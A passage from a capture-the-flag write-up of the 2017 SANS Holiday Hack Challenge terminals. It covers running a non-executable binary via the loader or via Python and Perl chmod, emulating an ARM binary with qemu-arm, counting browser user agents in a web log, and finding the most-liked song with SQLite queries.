that file itself, but always uses this helper program from the file you
specified, instead of the helper program file specified in the executable
file you run.  This is mostly of use for maintainers to test new versions
of this helper program; chances are you did not intend to run this program.
  --list                list all dependencies and how they are resolved
  --verify              verify that given object really is a dynamically linked
			object we can handle
  --inhibit-cache       Do not use /etc/ld.so.cache
  --library-path PATH   use given PATH instead of content of the environment
			variable LD_LIBRARY_PATH
  --inhibit-rpath LIST  ignore RUNPATH and RPATH information in object names
			in LIST
  --audit LIST          use objects named in LIST as auditors

elf@d5823d933b5d:~$ /lib64/ld-linux-x86-64.so.2 ./CandyCaneStriper 
</pre>
</div>
</div>

<div id="outline-container-orgf6588ac" class="outline-4">
<h4 id="cryokinetic_solution"><a id="orgf6588ac"></a>Solution</h4>
<div class="outline-text-4" id="text-cryokinetic_solution">
<pre class="example">
elf@784e43534178:~$ /lib64/ld-linux-x86-64.so.2 ./CandyCaneStriper
		   _..._
		 .'\\ //`,      
		/\\.'``'.=",
	       / \/     ;==|
	      /\\/    .'\`,`
	     / \/     `""`
	    /\\/
	   /\\/
	  /\ /
	 /\\/
	/`\/
	\\/
	 `
The candy cane striping machine is up and running!
</pre>
</div>
</div>

<div id="outline-container-org7c9540f" class="outline-4">
<h4 id="cryokinetic_alternatives"><a id="org7c9540f"></a>Alternatives</h4>
<div class="outline-text-4" id="text-cryokinetic_alternatives">
<p>
There are <b>many</b> different ways to solve this challenge.
</p>

<p>
Overwrite an executable file with the existing binary:
</p>

<pre class="example">
elf@2798541ad158:~$ ls -l /bin/chmod
-rwxr-xr-x 1 root root 0 Dec 15 20:00 /bin/chmod
elf@2798541ad158:~$ cp /bin/ls new
elf@2798541ad158:~$ cat CandyCaneStriper  &gt; new
elf@2798541ad158:~$ ls -l
total 96
-rw-r--r-- 1 root root 45224 Dec 15 19:59 CandyCaneStriper
-rwxr-xr-x 1 elf  elf  45224 Dec 17 00:15 new
elf@2798541ad158:~$ ./new
</pre>

<p>
Use python to chmod.  The chmod binary is just a wrapper around the
chmod libc function.  Any programming language will have this
available:
</p>

<div class="org-src-container">
<pre class="src src-python">&gt;&gt;&gt; <span style="color: #b5bd68;">import</span> os
&gt;&gt;&gt; os.chmod(<span style="color: #8abeb7;">"CandyCaneStriper"</span>, 0755)
Traceback (most recent call last):
  File <span style="color: #8abeb7;">"&lt;stdin&gt;"</span>, line 1, <span style="color: #b5bd68;">in</span> &lt;module&gt;
<span style="color: #81a2be;">OSError</span>: [Errno 1] Operation <span style="color: #b5bd68;">not</span> permitted: <span style="color: #8abeb7;">'CandyCaneStriper'</span>
</pre>
</div>

<p>
FAIL :(  For some reason we can't modify CandyCaneStriper.  What if make a copy first?
</p>

<pre class="example">
elf@d5823d933b5d:~$ cp CandyCaneStriper c
elf@d5823d933b5d:~$ python
Python 2.7.12 (default, Nov 20 2017, 18:23:56) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; import os
&gt;&gt;&gt; os.chmod("c", 0755)
&gt;&gt;&gt; ^d
elf@d5823d933b5d:~$ ./c
</pre>

<p>
With perl:
</p>

<pre class="example">
elf@1e6fe4ce3449:~$ cp CandyCaneStriper c
elf@1e6fe4ce3449:~$ cat &gt; fix.pl
chmod 0755 "c";
^d
elf@1e6fe4ce3449:~$ perl fix.pl 
String found where operator expected at fix.pl line 1, near "0755 "c""
	(Missing operator before  "c"?)
syntax error at fix.pl line 1, near "0755 "c""
Execution of fix.pl aborted due to compilation errors.
elf@1e6fe4ce3449:~$ cat &gt; fix.pl
chmod 0755, "c";
^d
elf@1e6fe4ce3449:~$ perl fix.pl 
elf@1e6fe4ce3449:~$ ./c
</pre>

<p>
Or as a perl one liner, now that we figured out the syntax:
</p>

<pre class="example">
elf@1e6fe4ce3449:~$ cp CandyCaneStriper c
elf@1e6fe4ce3449:~$ perl -e 'chmod 0755, "c"'
</pre>
</div>
</div>
</div>
<div id="outline-container-org5fcf992" class="outline-3">
<h3 id="org5fcf992">There's Snow Place Like Home</h3>
<div class="outline-text-3" id="text-org5fcf992">
</div>
<div id="outline-container-org726bf6a" class="outline-4">
<h4 id="home_question"><a id="org726bf6a"></a>Question</h4>
<div class="outline-text-4" id="text-home_question">
<pre class="example">

                             ______
                          .-"""".._'.       _,##
                   _..__ |.-"""-.|  |   _,##'`-._
                  (_____)||_____||  |_,##'`-._,##'`
                  _|   |.;-""-.  |  |#'`-._,##'`
               _.;_ `--' `\    \ |.'`\._,##'`
              /.-.\ `\     |.-";.`_, |##'`
              |\__/   | _..;__  |'-' /
              '.____.'_.-`)\--' /'-'`
               //||\\(_.-'_,'-'`
             (`-...-')_,##'`
      jgs _,##`-..,-;##`
       _,##'`-._,##'`
    _,##'`-._,##'`
      `-._,##'`
My name is Pepper Minstix, and I need your help with my plight.
I've crashed the Christmas toy train, for which I am quite contrite.
I should not have interfered, hacking it was foolish in hindsight.
If you can get it running again, I will reward you with a gift of delight.
</pre>
</div>
</div>

<div id="outline-container-org31cb3ae" class="outline-4">
<h4 id="home_how-to-find-the-terminal"><a id="org31cb3ae"></a>How to find the terminal</h4>
<div class="outline-text-4" id="text-home_how-to-find-the-terminal">
<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/41a1e6bb-60c3-4695-ad04-514fbcc76afa">https://2017.holidayhackchallenge.com/game/41a1e6bb-60c3-4695-ad04-514fbcc76afa</a>
</p>

<p>
Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=4050467e-9cde-44cd-aa63-1a0b8b210bb7&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=4050467e-9cde-44cd-aa63-1a0b8b210bb7&amp;uid=USER_ID</a>
</p>


<div class="figure">
<p><img src="./images/terminal-location-home.png" alt="terminal-location-home.png" />
</p>
<p><span class="figure-number">Figure 7: </span>The terminal is on the side of the center building.</p>
</div>
</div>
</div>

<div id="outline-container-orgf724754" class="outline-4">
<h4 id="home_background-information"><a id="orgf724754"></a>Background Information</h4>
<div class="outline-text-4" id="text-home_background-information">
<p>
We're logged in as the user elf. There's a file called <code>trainstartup</code> in our home directory.
</p>

<p>
This is a 64-bit x86 system:
</p>

<pre class="example">
elf@784e43534178:~$ uname -a
Linux 784e43534178 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 x86_64 x86_64 GNU/Linux
</pre>
</div>
</div>

<div id="outline-container-orgc019808" class="outline-4">
<h4 id="home_goal"><a id="orgc019808"></a>Goal</h4>
<div class="outline-text-4" id="text-home_goal">
<p>
It looks like we just want to run the <code>trainstartup</code> file, but if we try that, we get an exec error:
</p>

<pre class="example">
elf@784e43534178:~$ ./trainstartup 
bash: ./trainstartup: cannot execute binary file: Exec format error
</pre>
</div>
</div>

<div id="outline-container-org0454f92" class="outline-4">
<h4 id="home_hints"><a id="org0454f92"></a>Hints</h4>
<div class="outline-text-4" id="text-home_hints">
<p>
Pepper Minstix on Twitter has a hint:
</p>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Actually, <a href="https://twitter.com/GreenesterElf?ref_src=twsrc%5Etfw">@GreenesterElf</a> , you&#39;re better at prompt commands than I am. Why can&#39;t I get this model train thing working? I&#39;m in the right directory like you taught me, but this system is still saying &quot;No such file or directory&quot;</p>&mdash; Pepper Minstix (@PepperyGoodness) <a href="https://twitter.com/PepperyGoodness/status/938545233624678400?ref_src=twsrc%5Etfw">December 6, 2017</a></blockquote>

<p>
Holly Evergreen on Twitter has a hint for this as well:
</p>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">I still can&#39;t figure out Pepper Minstix&#39;s issue. It looks like the binary is compiled for another architecture. I think qemu can help, but I don&#39;t want to run the entire OS :\ <a href="https://t.co/pikSOOkyZe">https://t.co/pikSOOkyZe</a> helps, but I just want one binary, not the whole system!</p>&mdash; Holly Evergreen (@GreenesterElf) <a href="https://twitter.com/GreenesterElf/status/938552050253643777?ref_src=twsrc%5Etfw">December 6, 2017</a></blockquote>
</div>
</div>

<div id="outline-container-orgfa8251c" class="outline-4">
<h4 id="home_approach"><a id="orgfa8251c"></a>Approach</h4>
<div class="outline-text-4" id="text-home_approach">
<p>
There's really not much to go on here. We'll first use <code>file</code> to identify the <code>trainstartup</code> binary:
</p>

<pre class="example">
elf@784e43534178:~$ file trainstartup 
trainstartup: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=005de4685e8563d10b3de3e0be7d6fdd7ed732eb, not stripped
</pre>

<p>
So the file is a Linux ELF binary, but it's for the ARM processor, and not for the x86_64 system that we're on. Let's see if there are any programs in our path that have <code>arm</code> in the file name:
</p>

<pre class="example">
elf@784e43534178:~$ compgen -c | grep arm
qemu-arm
qemu-armeb
</pre>

<p>
Running it with the help option gives us:
</p>

<pre class="example">
elf@784e43534178:~$ qemu-arm -h
usage: qemu-arm [options] program [arguments...]
Linux CPU emulator (compiled for arm emulation)
...
</pre>

<p>
This looks like exactly what we need. <code>qemu-arm</code> provides us with an ARM emulator, and we just need to run it with our program as the single argument. Let's give it a shot:
</p>

<pre class="example">
elf@784e43534178:~$ qemu-arm ./trainstartup 
Starting up ... 

    Merry Christmas
    Merry Christmas
v
&gt;*&lt;
^
/o\
/   \               @.·
/~~   \                .
/ ° ~~  \         ·      
/      ~~ \       ◆       
/     °   ~~\      .   0
/~~           \    ─· ─ · o
    ┌┐       /° ·~~  .*·   . \
     ▒▒▒\     │  ──┬─°─┬─°─°─°─
≠==≠°=≠°=≠==──┼──=≠     ≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠
	      │   /└───┘\┌───┐                                                 
			 └───┘                                                 
≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠



You did it! Thank you!
</pre>

<p>
Success!
</p>
</div>
</div>

<div id="outline-container-org82a6f05" class="outline-4">
<h4 id="home_solution"><a id="org82a6f05"></a>Solution</h4>
<div class="outline-text-4" id="text-home_solution">
<p>
You need to use <code>qemu-arm</code> to run the ARM binary: <code>qemu-arm ./trainstartup</code>
</p>
</div>
</div>

<div id="outline-container-org9e942cc" class="outline-4">
<h4 id="home_alternatives"><a id="org9e942cc"></a>Alternatives</h4>
<div class="outline-text-4" id="text-home_alternatives">
<p>
The real difficulty of this terminal was in discovering that you
needed to use <code>qemu-arm</code>. <code>compgen -c</code> is a handy trick in CTFs to
figure out what special programs are installed on a certain
system. Another useful trick is using find to see what changes were
made to the system after it was installed. Let's take a quick look at
<code>qemu=arm</code> and at another file we know was changed, <code>trainstartup</code>:
</p>

<pre class="example">
elf@784e43534178:~$ stat /usr/bin/qemu-arm trainstartup 
  File: '/usr/bin/qemu-arm'
  Size: 1725888         Blocks: 3376       IO Block: 4096   regular file
Device: 801h/2049d      Inode: 1049395     Links: 1
Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2017-09-20 14:01:57.000000000 +0000
Modify: 2017-09-20 14:01:57.000000000 +0000
Change: 2017-12-06 20:01:07.719592650 +0000
 Birth: -
  File: 'trainstartup'
  Size: 454636          Blocks: 888        IO Block: 4096   regular file
Device: 801h/2049d      Inode: 1049511     Links: 1
Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2017-12-07 18:43:55.000000000 +0000
Modify: 2017-12-07 18:43:55.000000000 +0000
Change: 2017-12-07 18:43:58.191037092 +0000
 Birth: -
</pre>

<p>
If we look at the change time (or <code>ctime</code>), we can see that this
system was setup around December 6th, with the status of
<code>trainstartup</code> being changed the next day. An important thing to
remember with <code>ctime</code> is that the file contents didn't change, but
some data in the file inode did (permissions, creation,
etc.). Normally, we might use something like the modification time,
but that doesn't work well for files installed from packages.
</p>

<p>
A common way to setup a system is to first add sources to the package
manager, then install any necessary packages, and make any additional
modifications to a system. Let's use <code>find</code> to see what files were
modified after <code>/etc/apt</code> was changed, and we'll look for files with
<code>arm</code> in the name:
</p>

<pre class="example">
elf@784e43534178:~$ find / -xdev -cnewer /etc/apt/sources.list | grep -w arm
/usr/bin/qemu-arm
/usr/share/man/man1/qemu-arm.1.gz
</pre>

<p>
In this case, I'm using <code>-xdev</code> to restrict the <code>find</code> to files on the
same device (thus excluding <code>/sys</code>, <code>/proc</code>, etc.).
</p>

<p>
If that still didn't work, here's a one-liner to sort the files on the
system according to when their <code>ctime</code> was modified. This would enable
you to see a complete timeline of changes to files:
</p>

<pre class="example">
elf@784e43534178:~$ find / -xdev -printf "%C+\t%p\n" | sort | head
2017-12-04+14:36:51.7363603170  /bin/bash
2017-12-04+14:36:51.7363603170  /bin/bunzip2
2017-12-04+14:36:51.7363603170  /bin/bzcat
2017-12-04+14:36:51.7363603170  /bin/bzcmp
2017-12-04+14:36:51.7363603170  /bin/bzdiff
2017-12-04+14:36:51.7363603170  /bin/bzegrep
...
</pre>
</div>
</div>

<div id="outline-container-orgc32ede8" class="outline-4">
<h4 id="home_common-pitfalls"><a id="orgc32ede8"></a>Common Pitfalls</h4>
<div class="outline-text-4" id="text-home_common-pitfalls">
<p>
This terminal was tricky because almost no information was
given. Knowing how to use <code>file</code> to identify that <code>trainstartup</code> was
an ARM binary, and knowing how to find <code>qemu-arm</code> was key.
</p>

<p>
If you simply google "cannot execute binary file: Exec format error" it will
lead you down a rabbit hole.  Normally, this error is caused by downloading a
binary for the wrong architecture and the fix is to simply re-download the
right binary.  In this case, we can't download a version of the binary built
for the correct architecture.  What we need to do is "Run arm binary on amd64".
Searching for this points us to using qemu as an emulator.
</p>
</div>
</div>
</div>
<div id="outline-container-org959931a" class="outline-3">
<h3 id="org959931a">Bumble's Bounce</h3>
<div class="outline-text-3" id="text-org959931a">
</div>
<div id="outline-container-org44817e2" class="outline-4">
<h4 id="bounce_question"><a id="org44817e2"></a>Question</h4>
<div class="outline-text-4" id="text-bounce_question">
<pre class="example">
                           ._    _.
                           (_)  (_)                  &lt;&gt; \  / &lt;&gt;
                            .\::/.                   \_\/  \/_/ 
           .:.          _.=._\\//_.=._                  \\//
      ..   \o/   ..      '=' //\\ '='             _&lt;&gt;_\_\&lt;&gt;/_/_&lt;&gt;_
      :o|   |   |o:         '/::\'                 &lt;&gt; / /&lt;&gt;\ \ &lt;&gt;
       ~ '. ' .' ~         (_)  (_)      _    _       _ //\\ _
           &gt;O&lt;             '      '     /_/  \_\     / /\  /\ \
       _ .' . '. _                        \\//       &lt;&gt; /  \ &lt;&gt;
      :o|   |   |o:                   /\_\\&gt;&lt;//_/\
      ''   /o\   ''     '.|  |.'      \/ //&gt;&lt;\\ \/
           ':'        . ~~\  /~~ .       _//\\_
jgs                   _\_._\/_._/_      \_\  /_/ 
                       / ' /\ ' \                   \o/
       o              ' __/  \__ '              _o/.:|:.\o_
  o    :    o         ' .'|  |'.                  .\:|:/.
    '.\'/.'                 .                 -=&gt;&gt;::&gt;o&lt;::&lt;&lt;=-
    :-&gt;@&lt;-:                 :                   _ '/:|:\' _
    .'/.\'.           '.___/*\___.'              o\':|:'/o 
  o    :    o           \* \ / */                   /o\
       o                 &gt;--X--&lt;
                        /*_/ \_*\
                      .'   \*/   '.
                            :
                            '
Minty Candycane here, I need your help straight away.
We're having an argument about browser popularity stray.
Use the supplied log file from our server in the North Pole.
Identifying the least-popular browser is your noteworthy goal.
</pre>
</div>
</div>

<div id="outline-container-orgf4bd7e9" class="outline-4">
<h4 id="bounce_how-to-find-the-terminal"><a id="orgf4bd7e9"></a>How to find the terminal</h4>
<div class="outline-text-4" id="text-bounce_how-to-find-the-terminal">
<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/dbb44df8-af5e-4136-b72e-ebd9dfb32b4a">https://2017.holidayhackchallenge.com/game/dbb44df8-af5e-4136-b72e-ebd9dfb32b4a</a>
</p>

<p>
Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=595aeb87-d3b2-41a3-b612-fa553a30e822&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=595aeb87-d3b2-41a3-b612-fa553a30e822&amp;uid=USER_ID</a>
</p>


<div class="figure">
<p><img src="./images/terminal-location-bounce.png" alt="terminal-location-bounce.png" />
</p>
<p><span class="figure-number">Figure 8: </span>The terminal is located at the top of the right hand hill.</p>
</div>
</div>
</div>

<div id="outline-container-orge444108" class="outline-4">
<h4 id="bounce_background-information"><a id="orge444108"></a>Background Information</h4>
<div class="outline-text-4" id="text-bounce_background-information">
</div>
</div>

<div id="outline-container-org9503979" class="outline-4">
<h4 id="bounce_goal"><a id="org9503979"></a>Goal</h4>
<div class="outline-text-4" id="text-bounce_goal">
<p>
The goal is to analyze a 'log file' and determine what the least popular browser.
</p>
</div>
</div>

<div id="outline-container-orgc670b2a" class="outline-4">
<h4 id="bounce_hints"><a id="orgc670b2a"></a>Hints</h4>
<div class="outline-text-4" id="text-bounce_hints">
<p>
Minty Candycane on Twitter has some hints
</p>

<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Oh wow, <a href="https://twitter.com/Sw4mp_f0x?ref_src=twsrc%5Etfw">@Sw4mp_f0x</a> and <a href="https://twitter.com/bluscreenofjeff?ref_src=twsrc%5Etfw">@bluscreenofjeff</a> did a great job on this Parsing for Pentesters series! <a href="https://t.co/g1LcCWjH4Q">https://t.co/g1LcCWjH4Q</a></p>&mdash; Minty Candycane (@SirMintsALot) <a href="https://twitter.com/SirMintsALot/status/938188406546251777?ref_src=twsrc%5Etfw">December 5, 2017</a></blockquote>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">The only thing that last article didn&#39;t really help me with was *counting* unique lines. This post looks super helpful for that! <a href="https://t.co/QaPQ4Ml0JD">https://t.co/QaPQ4Ml0JD</a> (it&#39;s even against web server logs, just the wrong field)</p>&mdash; Minty Candycane (@SirMintsALot) <a href="https://twitter.com/SirMintsALot/status/938574395240366080?ref_src=twsrc%5Etfw">December 7, 2017</a></blockquote>
</div>
</div>

<div id="outline-container-org807394f" class="outline-4">
<h4 id="bounce_approach"><a id="org807394f"></a>Approach</h4>
<div class="outline-text-4" id="text-bounce_approach">
<p>
A directory listing shows that terminal contains a binary called 'runtoanswer',
as well as fairly large 'access.log' file:
</p>

<pre class="example">
elf@784e43534178:~$ ls -lh
total 29M
-rw-r--r-- 1 root root  24M Dec  4 17:11 access.log
-rwxr-xr-x 1 root root 5.0M Dec 11 17:31 runtoanswer
elf@784e43534178:~$ wc -l access.log 
98655 access.log

elf@784e43534178:~$ head -n1 access.log 
XX.YY.66.201 - - [19/Nov/2017:06:50:30 -0500] "GET /robots.txt HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
</pre>

<p>
Seems we have a web log in the "Common Log Format", which as it turns out, used
to be called the "NCSA Common log format" when it was output by NCSA HTTPd in 1993
before that became apache.  It always struck me as an arbitrary log format..
Fields are separated by spaces, except for the date/time which is wrapped in
brackets.  Also except for the request which has the "method uri protocol"
quoted, and the user agent quoted as well.  Some fields are also hex encoded.  Anyway,
since we just want the user-agents, we can split the log lines on the double quote char.
</p>
</div>
</div>

<div id="outline-container-org96ee71d" class="outline-4">
<h4 id="bounce_solution"><a id="org96ee71d"></a>Solution</h4>
<div class="outline-text-4" id="text-bounce_solution">
<p>
My solution is to use the <code>cut</code> tool, along with <code>sort</code> and <code>uniq</code> to find the least popular browser.
<code>cut</code> is very limited compared to tools like <code>awk</code> or <code>sed</code>, but it is often simpler
to use.  We just need to grab the right field.  We can experiment on just the
first line using <code>head</code> and figure this out using trial and error:
</p>

<pre class="example">
elf@784e43534178:~$ head -n 1 access.log |cut -d '"' -f 4
-
elf@784e43534178:~$ head -n 1 access.log |cut -d '"' -f 5

elf@784e43534178:~$ head -n 1 access.log |cut -d '"' -f 6
Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)
</pre>

<p>
The 6th field is the user agent.  We also only want everything to the left of the first slash, so
different versions of the same browser are merged:
</p>

<pre class="example">
elf@784e43534178:~$ head -n 1 access.log |cut -d '"' -f 6|cut -d / -f 1
Mozilla
</pre>

<p>
Now that the browser is isolated, we can switch <code>head -n 1</code> with <code>cat</code>, and use the
standard <code>sort | uniq -c | sort -n</code> to grab a frequency:
</p>

<pre class="example">
elf@784e43534178:~$ cat access.log |cut -d '"' -f 6|cut -d / -f 1|sort|uniq -c|sort -n|tail -n 5
     33 slack
     34 Googlebot-Image
    143 -
    422 Slack-ImgProxy (+https:
  97896 Mozilla
</pre>

<p>
Oops.. I mixed up the ordering, need the first 5, not the last 5:
</p>

<pre class="example">
elf@784e43534178:~$ cat access.log |cut -d '"' -f 6|cut -d / -f 1|sort|uniq -c|sort -n|head -n 5
      1 Dillo
      2 (KHTML, like Gecko) Chrome
      2 Slackbot-LinkExpanding 1.0 (+https:
      2 Telesphoreo
      2 Twitter
</pre>

<p>
Looks like my favorite lightweight browser from 2001 is not very popular these days.
</p>

<p>
I can also confirm that the log file only has a single entry for this user-agent:
</p>

<pre class="example">
elf@784e43534178:~$ grep Dillo access.log 
XX.YY.54.139 - - [27/Nov/2017:19:41:49 -0500] "GET /invoker/JMXInvokerServlet HTTP/1.1" 301 185 "-" "Dillo/3.0.5"
</pre>
</div>
</div>

<div id="outline-container-org695f788" class="outline-4">
<h4 id="bounce_alternatives"><a id="org695f788"></a>Alternatives</h4>
<div class="outline-text-4" id="text-bounce_alternatives">
</div>
</div>

<div id="outline-container-org2f87325" class="outline-4">
<h4 id="bounce_common-pitfalls"><a id="org2f87325"></a>Common Pitfalls</h4>
<div class="outline-text-4" id="text-bounce_common-pitfalls">
<p>
The most common issue appeared to be the result of not normalizing the different browser versions.
If you count each VERSION of a browser as a separate program, you will get a result like:
</p>

<pre class="example">
elf@784e43534178:~$ cat access.log |cut -d '"' -f 6|sort|uniq  -c|sort -n|head -n 5
      1 Dillo/3.0.5
      1 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
      1 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko)
      1 Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1
      1 Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
</pre>

<p>
or like:
</p>

<pre class="example">
elf@784e43534178:~$ cat access.log |cut -d '"' -f 6|cut -d ' ' -f 1|sort|uniq  -c|sort -n
      1 Dillo/3.0.5
      1 curl/7.35.0
</pre>
</div>
</div>
</div>
<div id="outline-container-orgacb3305" class="outline-3">
<h3 id="orgacb3305">I Don't Think We're In Kansas Anymore</h3>
<div class="outline-text-3" id="text-orgacb3305">
</div>
<div id="outline-container-orga9742c1" class="outline-4">
<h4 id="kansas_question"><a id="orga9742c1"></a>Question</h4>
<div class="outline-text-4" id="text-kansas_question">
<pre class="example">
                       *
                      .~'
                     O'~..
                    ~'O'~..
                   ~'O'~..~'
                  O'~..~'O'~.
                 .~'O'~..~'O'~
                ..~'O'~..~'O'~.
               .~'O'~..~'O'~..~'
              O'~..~'O'~..~'O'~..
             ~'O'~..~'O'~..~'O'~..
            ~'O'~..~'O'~..~'O'~..~'
           O'~..~'O'~..~'O'~..~'O'~.
          .~'O'~..~'O'~..~'O'~..~'O'~
         ..~'O'~..~'O'~..~'O'~..~'O'~.
        .~'O'~..~'O'~..~'O'~..~'O'~..~'
       O'~..~'O'~..~'O'~..~'O'~..~'O'~..
      ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
     ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
    O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
   .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~
  ..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
 .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..

Sugarplum Mary is in a tizzy, we hope you can assist.
Christmas songs abound, with many likes in our midst.
The database is populated, ready for you to address.
Identify the song whose popularity is the best.
</pre>
</div>
</div>

<div id="outline-container-orgee29643" class="outline-4">
<h4 id="kansas_how-to-find-the-terminal"><a id="orgee29643"></a>How to find the terminal</h4>
<div class="outline-text-4" id="text-kansas_how-to-find-the-terminal">
<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/5bbfc970-71d2-4c9d-816c-25955536c168">https://2017.holidayhackchallenge.com/game/5bbfc970-71d2-4c9d-816c-25955536c168</a>
</p>

<p>
Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=ab13b9fc-6e7c-4477-a8a1-bca7b616b877&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=ab13b9fc-6e7c-4477-a8a1-bca7b616b877&amp;uid=USER_ID</a>
</p>


<div class="figure">
<p><img src="./images/terminal-location-kansas.png" alt="terminal-location-kansas.png" />
</p>
<p><span class="figure-number">Figure 9: </span>If you take away the poppies the terminal can easily be seen on the left hand side of the field.</p>
</div>
</div>
</div>

<div id="outline-container-orgcf3b12c" class="outline-4">
<h4 id="kansas_background-information"><a id="orgcf3b12c"></a>Background Information</h4>
<div class="outline-text-4" id="text-kansas_background-information">
<p>
When we login, we see we have two files of interest in our current
directory: <code>christmassongs.db</code> and <code>runtoanswer</code>.
</p>

<p>
If we try running <code>runtoanswer</code>, we see:
</p>

<pre class="example">
elf@197ceebbd305:~$ ./runtoanswer 
Starting up, please wait......
Enter the name of the song with the most likes:
</pre>

<p>
Blog Posts:
</p>

<p>
The SANS Pen-Test Blog had a post about essential SQL commands, which might be useful:
</p>

<blockquote>
<p>
Your Pokemon Guide for Essential SQL Pen Test Commands
  <a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
</p>
</blockquote>
</div>
</div>

<div id="outline-container-org613a5f6" class="outline-4">
<h4 id="kansas_goal"><a id="org613a5f6"></a>Goal</h4>
<div class="outline-text-4" id="text-kansas_goal">
<p>
Determine which song in <code>christmassongs.db</code> has the most likes.
</p>
</div>
</div>

<div id="outline-container-org5c78e64" class="outline-4">
<h4 id="kansas_hints"><a id="org5c78e64"></a>Hints</h4>
<div class="outline-text-4" id="text-kansas_hints">
<p>
Sugarplum Mary on Twitter has a hint: 
</p>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Hey <a href="https://twitter.com/PepperyGoodness?ref_src=twsrc%5Etfw">@PepperyGoodness</a>, can you help me with an SQL problem I&#39;ve seen? I think I need to do GROUP BY, but I&#39;m not quite sure of the syntax.</p>&mdash; SugerPlum Mary (@ThePlumSweetest) <a href="https://twitter.com/ThePlumSweetest/status/941067133898833921?ref_src=twsrc%5Etfw">December 13, 2017</a></blockquote>
</div>
</div>

<div id="outline-container-org675287d" class="outline-4">
<h4 id="kansas_approach"><a id="org675287d"></a>Approach</h4>
<div class="outline-text-4" id="text-kansas_approach">
<p>
Let's see exactly what this "db" file is:
</p>

<pre class="example">
elf@0d0185762210:~$ less christmassongs.db 
bash: less: command not found
elf@0d0185762210:~$ more christmassongs.db 
SQLite format 3
...
</pre>

<p>
sqlite!  Ok!  Let's start up sqlite and change some output options
</p>

<pre class="example">
elf@5cf3b692a837:~$ sqlite3 christmassongs.db 
SQLite version 3.11.0 2016-02-15 17:29:24
Enter ".help" for usage hints.
sqlite&gt; .mode tabs  
sqlite&gt; .headers on
</pre>

<p>
Now, let's see what we are working with here.
</p>

<pre class="example">
sqlite&gt; .schema
CREATE TABLE songs(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  title TEXT,
  artist TEXT,
  year TEXT,
  notes TEXT
);
CREATE TABLE likes(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  like INTEGER,
  datetime INTEGER,
  songid INTEGER,
  FOREIGN KEY(songid) REFERENCES songs(id)
);
</pre>

<p>
As a sanity check, let's see what one record of each looks like.
</p>

<pre class="example">
sqlite&gt; select * from songs limit 1;
id      title   artist  year    notes
1       A' Soalin'      Peter, Paul &amp; Mary      1963    From the album Moving. Written by Paul Stookey, Tracy Batteste &amp; Elaina Mezzetti. Contains an element of "God Res
t Ye Merry, Gentlemen".
sqlite&gt; select * from likes limit 1;
id      like    datetime        songid
1       1       1487102189      250
</pre>

<p>
Two tables, "songs", and "likes".  <code>likes.songid</code> matches up with <code>songs.id</code>.
This means we can join the two tables together on <code>songs.id=likes.songid</code>.  Once that
is done, the solution requires the count of likes grouped by title:
</p>

<pre class="example">
sqlite&gt; select title, count(*) from songs, likes where songs.id=likes.songid group by title order by count(*) desc limit 3;
title   count(*)
Stairway to Heaven      11325
Joy to the World        2162
The Little Boy that Santa Claus Forgot  2140
sqlite&gt; 
</pre>
</div>
</div>

<div id="outline-container-org8667ac7" class="outline-4">
<h4 id="kansas_solution"><a id="org8667ac7"></a>Solution</h4>
<div class="outline-text-4" id="text-kansas_solution">
<p>
A one-liner is:
</p>

<pre class="example">
elf@1dea81eaaac4:~$ sqlite3 christmassongs.db "select title from songs, likes where songs.id=likes.songid group by title order by count(*) desc limit 1;"
Stairway to Heaven
</pre>
</div>
</div>

<div id="outline-container-org5c23f87" class="outline-4">
<h4 id="kansas_alternatives"><a id="org5c23f87"></a>Alternatives</h4>
